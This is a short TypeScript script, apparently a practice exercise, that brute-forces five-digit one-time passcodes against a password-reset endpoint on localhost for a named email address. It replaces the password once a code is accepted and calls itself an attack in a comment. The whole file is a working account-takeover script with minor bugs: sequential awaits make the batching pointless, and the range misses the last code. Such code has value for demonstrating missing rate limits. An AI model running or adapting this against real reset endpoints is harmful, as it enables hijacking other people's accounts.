import axios from "axios";

const TARGET_EMAIL = "abhishek@gmail.com";

async function tryOtp(otp: string) {
  try {
    const res = await axios.post("http://localhost:9000/reset-password", {
      email: TARGET_EMAIL,
      otp,
      newPassword: "NewSecurePass@123",
    });

    if (res.data.success) {
      console.log(`✅ FOUND OTP: ${otp}`);
      process.exit(0); // Stop the attack
    } else {
      console.log(`❌ Tried OTP: ${otp}`);
    }
  } catch (error) {
    console.log(`❌ Request failed for OTP: ${otp}`);
  }
}

const MIN = 10000
const MAX = 99999
const BATCH_SIZE = 100

async function brutforce() {
  for(let i=MIN ; i< MAX; i+=BATCH_SIZE){
    let batch =[];

    for(let j=i; j<i+BATCH_SIZE; j++){
      batch.push(await tryOtp(j.toString()))
    }
    Promise.all(batch)
  }
}

brutforce()